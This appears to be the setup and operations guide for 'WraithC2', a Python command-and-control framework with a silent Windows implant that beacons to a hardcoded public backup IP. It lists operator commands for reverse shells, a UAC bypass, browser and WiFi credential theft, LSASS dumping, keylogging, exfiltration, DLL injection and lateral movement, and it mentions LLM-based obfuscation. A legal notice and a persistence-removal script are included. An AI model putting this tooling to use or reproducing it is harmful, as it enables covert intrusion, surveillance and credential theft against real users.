# WraithC2 C2 Framework â€” Setup & Operations Guide

> **Legal Notice** â€” This software is intended for authorised security testing, penetration testing on systems you own or have explicit written permission to test, and academic research only.  Unauthorised use against systems you do not own is illegal in most jurisdictions.

---

## Table of Contents

1. [Architecture Overview](#1-architecture-overview)
2. [Requirements](#2-requirements)
3. [Installation](#3-installation)
4. [Configuration](#4-configuration)
5. [Running the Server](#5-running-the-server)
6. [Deploying the Client](#6-deploying-the-client)
7. [Server CLI Reference](#7-server-cli-reference)
8. [Dashboard](#8-dashboard)
9. [Compiling the Client to EXE](#9-compiling-the-client-to-exe)
10. [Removing Client Persistence](#10-removing-client-persistence)
11. [File Storage Layout](#11-file-storage-layout)
12. [Troubleshooting](#12-troubleshooting)

---

## 1. Architecture Overview

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”        HTTP (port 80)       â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   Operator Machine        â”‚ â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–º â”‚   Target Machine      â”‚
â”‚                           â”‚                              â”‚                       â”‚
â”‚  server.py  (Flask C2)    â”‚   /api/beacon  (30 s loop)  â”‚  WraithC2.py/exe    â”‚
â”‚  dashboard.html (browser) â”‚   /api/result               â”‚  (runs silently)      â”‚
â”‚  storage/   (all files)   â”‚   /api/upload               â”‚                       â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   /api/screenshot            â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

- **server.py** â€” Flask + SocketIO C2 server.  Listens on port 80.
- **dashboard.html** â€” Real-time browser UI served by the C2; shows live clients, results terminal.
- **WraithC2.py / WraithC2.exe** â€” The client agent.  Beacons every 30 seconds, executes queued commands, sends back all output.
- **config.py** â€” Single shared config file used by both server and client.

---

## 2. Requirements

| Component | Version |
|-----------|---------|
| Python    | 3.11+   |
| OS (server) | Windows / Linux |
| OS (client) | Windows 10/11 |
| Open port  | TCP 80 (HTTP) |

Python packages â€” see `requirements.txt`.  Key ones:

| Package | Used for |
|---------|----------|
| flask, flask-socketio | C2 web server + real-time dashboard |
| pycryptodome | AES-256-CBC per-session encryption |
| requests | Client HTTP beacon |
| pynput | Keylogger + keyboard simulation |
| Pillow | Screenshots |
| pywin32 | Windows API (DLL injection, registry, clipboard) |
| pycaw / comtypes | Windows volume control |
| wmi | WMI persistence |
| pypsexec | Lateral movement via SMB/PsExec |
| psutil | System info, process list |

---

## 3. Installation

### Server machine

```bash
# Clone / copy the WraithC2 folder to the server machine
cd WraithC2

# Create virtual environment
python -m venv .venv

# Activate (Windows)
.venv\Scripts\activate

# Activate (Linux/Mac)
source .venv/bin/activate

# Install all dependencies
pip install -r requirements.txt

# pywin32 post-install (Windows only â€” required once)
python .venv\Scripts\pywin32_postinstall.py -install
```

### Client machine (Python source)

```bash
# Same steps â€” only client-side packages are strictly needed
pip install -r requirements.txt
python .venv\Scripts\pywin32_postinstall.py -install
```

---

## 4. Configuration

All settings live in **`config.py`** â€” edit before deploying.

```python
# Network
SERVER_HOST = '0.0.0.0'        # server binds all interfaces
SERVER_PORT = 80                # HTTP only

C2_PRIMARY  = 'http://192.168.100.2'   # primary C2 IP
C2_BACKUP   = 'http://4.227.98.248'    # fallback C2 IP

# Authentication â€” change this before deployment!
SERVER_API_KEY = '<generate with: python -c "import secrets; print(secrets.token_hex(32))">'

# AI obfuscation (OpenRouter)
OPENROUTER_API_KEY = 'sk-or-v1-...'
OPENROUTER_MODEL   = 'deepseek/deepseek-r1:free'

# Timing
SLEEP_TIME  = 30    # seconds between beacons
MAX_RETRIES = 3
```

> **Important** â€” `config.py` must be identical on both server and all clients.

---

## 5. Running the Server

```bash
# From the WraithC2 directory with venv active:
python server.py
```

- Dashboard opens at `http://192.168.100.2/`
- Server logs go to `WraithC2_server.log` (Werkzeug HTTP noise is suppressed from terminal)
- The CLI prompt appears immediately in the terminal

---

## 6. Deploying the Client

**Option A â€” Python script (test/development):**
```bash
python WraithC2.py
```
The client runs silently (no output, no log file).

**Option B â€” Compiled EXE (deployment):**
```bash
# Double-click compile.bat  OR  run from terminal:
compile.bat
# Output: dist\WraithC2.exe
```
Copy `dist\WraithC2.exe` to the target machine and run it.

---

## 7. Server CLI Reference

### Server Commands

| Command | Description |
|---------|-------------|
| `server help` | Show full help menu |
| `server show clients` | Table of all connected clients with ID, hostname, IP, status |
| `server control N` | Set active client by number (from `show clients`) |
| `server control SESSION_ID` | Set active client by full session ID |
| `server list DIRECTORY` | List files in a directory on the server |
| `server shell` | Open interactive shell on the server machine |
| `server exit` | Gracefully shut down the C2 server |

### Client Commands (requires active client set via `server control`)

#### Execution
| Command | Description |
|---------|-------------|
| `client shell COMMAND` | Run OS command; output returned to dashboard |
| `client shell COMMAND &` | Run in background |
| `client reverse IP:PORT` | Open reverse TCP shell |
| `client uac bypass [CMD]` | UAC bypass via fodhelper |

#### Recon
| Command | Description |
|---------|-------------|
| `client sysinfo` | CPU, RAM, NICs, processes, env vars |
| `client scan [ip/subnet]` | TCP port scan (blank = local /24) |
| `client find [PATH]` | Hunt for keys, wallets, .env files, KeePass DBs |
| `client browser creds` | Dump Chrome/Edge/Brave saved logins |
| `client wifi creds` | All saved WiFi SSIDs + passwords |
| `client minidump` | LSASS memory dump â†’ uploaded to storage/ |
| `client get clipboard` | Grab clipboard; printed to terminal + saved to storage/ |

#### Surveillance
| Command | Description |
|---------|-------------|
| `client keylog on` | Start keylogger |
| `client keylog off` | Stop keylogger + flush to server |
| `client screenshot` | Single screenshot â†’ storage/ |
| `client screenshot stream N` | N screenshots 2 s apart |

#### File Transfer
| Command | Description |
|---------|-------------|
| `client download PATH` | Exfiltrate file/folder â†’ server storage/ |
| `client upload FILENAME` | Push file from server storage/ â†’ client temp dir |

#### Interaction
| Command | Description |
|---------|-------------|
| `client type TEXT` | Type text + Enter on client keyboard |
| `client display IMAGE` | Display image on client screen |
| `client volume 0â€“100` | Set system volume |
| `client play FILE.wav` | Play WAV audio |

#### Advanced
| Command | Description |
|---------|-------------|
| `client inject PID,DLL` | Inject DLL into process |
| `client lateral IP,USER,PASS` | Move laterally via pypsexec |
| `client delay SECONDS` | Change beacon interval |
| `client kill` | Shut down client permanently |
| `client cleanup` | Remove persistence + self-delete |

### Multi-Client Commands

```
multi all COMMAND          â†’ run on every connected client
multi 1,2,3 COMMAND        â†’ run on clients #1, #2, #3
```

### Bare OS Commands

If you just type a command with no prefix (e.g. `ipconfig`, `whoami`) it is sent as a shell command to the active client.

---

## 8. Dashboard

Open `http://192.168.100.2/` in a browser while the server is running.

| Panel | Description |
|-------|-------------|
| Connected Clients | Live table; click a client to load details |
| Live Results Terminal | Green-on-black output pane; receives all shell/recon output in real time |
| Command Panel | Drop-down to select command type + send to selected client |
| Screenshots | Thumbnails of received screenshots |
| Keylogs | Keystroke data received from clients |

---

## 9. Compiling the Client to EXE

```
compile.bat
```

**Flags used:**

| Flag | Effect |
|------|--------|
| `--onefile` | Everything packed into one `.exe` |
| `--noconsole` | No terminal window, no taskbar icon |
| `--clean` | Remove stale PyInstaller cache first |
| `--hidden-import` | Force-include all dynamic imports |
| `--add-data config.py;.` | Bundle config alongside the exe |

Output: `dist\WraithC2.exe`

Build artefacts (`build\`, `WraithC2.spec`) are deleted automatically.

---

## 10. Removing Client Persistence

Run the following in an **admin PowerShell** on the target/test machine:

```powershell
# 1. Registry Run key
$key = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty $key | ForEach-Object {
    $_.PSObject.Properties |
    Where-Object { $_.Value -like '*python*' -or $_.Value -like '*WraithC2*' } |
    ForEach-Object { Remove-ItemProperty -Path $key -Name $_.Name -Force }
}

# 2. Scheduled tasks
schtasks /Query /FO CSV |
    ConvertFrom-Csv |
    Where-Object { $_.'Task To Run' -like '*python*' -or $_.'Task To Run' -like '*WraithC2*' } |
    ForEach-Object { schtasks /Delete /TN $_.TaskName /F }

# 3. WMI event subscriptions
Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
Get-WMIObject -Namespace root\subscription -Class __EventFilter              | Remove-WmiObject
Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer   | Remove-WmiObject

# 4. Kill any running instance
Get-Process python, WraithC2 -ErrorAction SilentlyContinue | Stop-Process -Force

# 5. Delete the script / exe
# Remove-Item "C:\path\to\WraithC2.py" -Force
# Remove-Item "C:\path\to\WraithC2.exe" -Force
```

---

## 11. File Storage Layout

All server-side files live in `WraithC2\storage\`:

| File pattern | Source |
|--------------|--------|
| `screenshot_CLIENTID_DATE.png` | `client screenshot` |
| `upload_CLIENTID_DATE.zip` | `client download PATH` |
| `clipboard_CLIENTID_DATE.txt` | `client get clipboard` |
| `*.wav`, `*.exe`, `*.pdf` | Files pushed TO clients via `client upload` |

Client temp files (WAV, LSASS dump, keys) are written to `%TEMP%` and cleaned up automatically.

---

## 12. Troubleshooting

| Symptom | Fix |
|---------|-----|
| `ImportError: No module named win32api` | Run `python pywin32_postinstall.py -install` as admin |
| Client shows `OpenRouter HTTP 404` | Model slug wrong â€” verify `OPENROUTER_MODEL = 'deepseek/deepseek-r1:free'` in config.py |
| Beacon 401 errors | `SERVER_API_KEY` mismatch between server and client config.py |
| Client connects but commands don't run | Check `server show clients` â€” if two entries with same hostname exist, use `server control N` to target the active one |
| `table clients has no column named encryption_key` | Old DB â€” delete `WraithC2.db` and restart server; it rebuilds automatically |
| Volume command returns error | `pycaw` requires default audio device â€” won't work on machines with no audio hardware |
| EXE flagged by Windows Defender | Expected for PyInstaller one-file builds on test machines.  Add exclusion in Windows Security settings for your **lab environment** |
